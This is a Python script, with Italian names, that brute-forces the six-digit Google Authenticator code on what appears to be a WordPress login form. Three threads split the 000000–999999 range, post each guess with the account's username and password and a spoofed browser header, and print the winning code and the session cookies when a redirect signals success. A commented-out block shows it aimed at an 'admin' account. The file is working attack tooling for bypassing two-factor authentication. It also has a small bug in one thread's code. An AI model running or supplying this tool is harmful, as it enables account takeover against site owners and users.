import random, time
from threading import Condition, RLock, Thread, Lock
from sys import version
from typing import Union

from requests import Session
from rich.progress import Progress, ProgressColumn

session = Session()


class Striscia(Progress):
    def __init__(self, server, username, password, *columns: Union[str, ProgressColumn]):
        super().__init__(*columns)
        self.fine = False
        self.start1 = 0
        self.start2 = 333334
        self.start3 = 666667
        self.lock1 = Lock()
        self.lock2 = Lock()
        self.lock3 = Lock()
        self.total_cont = 0
        self.server = server
        self.username = username
        self.password = password
        self.add_task("[bold yellow]Discovering token...", total=999999)
        self.start()
        self.total_cont = 0

    def myprint(self):
        cont1 = self.start1
        cont2 = self.start2 - 333333
        cont3 = self.start3 - 666666
        current_advance = cont1 + cont2 + cont3 - self.total_cont
        self.total_cont = (cont1 + cont2 + cont3)
        return current_advance

    def login(self, code):
        headers = {'User-Agent': "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0"}
        data = {
            "log": self.username,
            "pwd": self.password,
            "googleotp": str(code).zfill(6),
            'rememberme': 'forever'
        }
        response = session.post(f"{self.server}", headers=headers, data=data, allow_redirects=False, verify=False)
        self.update(task_id=self.tasks[0].id, description="[bold yellow]Discovering token " + str(self.total_cont) + "/999999",
                    advance=self.myprint())
        if response.status_code == 302:
            result = {
                'token': code,
                'cookies': response.cookies.get_dict()
            }
            print(result)
            return True
        return False

    def muovi1(self):
        with self.lock1:
            if not self.fine:
                result = self.login(self.start1)
                # print("Token :" + str(self.start1))
                if self.start1 <= 333334:
                    self.start1 += 1
                if result or (self.start1 == 333335 and self.start2 == 666668 and self.start3 == 1000001):
                    self.update(task_id=self.tasks[0].id, description="[bold green]Token found", advance=999999)
                    self.fine = True
            return self.fine

    def muovi2(self):
        with self.lock2:
            if not self.fine:
                result = self.login(self.start2)
                # print("Token :" + str(self.start2))
                if self.start2 <= 666667:
                    self.start2 += 1
                if result or (self.start1 == 333334 and self.start2 == 666667 and self.start3 == 1000000):
                    self.update(task_id=self.tasks[0].id, description="[bold green]Token found", advance=999999)
                    self.fine = True
            return self.fine

    def muovi3(self):
        with self.lock3:
            if not self.fine:
                result = self.login(self.start3)
                # print("Token :" + str(self.start3))
                if self.start3 <= 1000000:
                    self.start3 += 1
                if result or (self.start1 == 333334 and self.start2 == 666667 and self.start3 == 1000000):
                    self.update(task_id=self.task, description="[bold green]Token found", advance=999999)
                    self.fine = True
            return self.fine


class wpbiff1(Thread):

    def __init__(self, s):
        Thread.__init__(self)
        self.striscia = s

    def run(self):
        print("First run 1")
        while not self.striscia.muovi1():
            time.sleep(0.0)
        print("Fine 1")


class wpbiff2(Thread):

    def __init__(self, s):
        Thread.__init__(self)
        self.striscia = s

    def run(self):
        print("First run 2")
        while not self.striscia.muovi2():
            time.sleep(0.0)
        print("Fine 2")


class wpbiff3(Thread):

    def __init__(self, s):
        Thread.__init__(self)
        self.striscia = s

    def run(self):
        print("First run 3")
        while not self.striscia.muovi3():
            time.sleep(0.0)
        print("Fine 3")


'''print("Start Gatto & Topo")

striscia = Striscia("","admin","ubuntu",)
jerry = wpbiff1(striscia)
tom = wpbiff2(striscia)
pluto = wpbiff3(striscia)
dprint("Created Threads")
jerry.start()
tom.start()
pluto.start()

dprint("Threads started.")'''
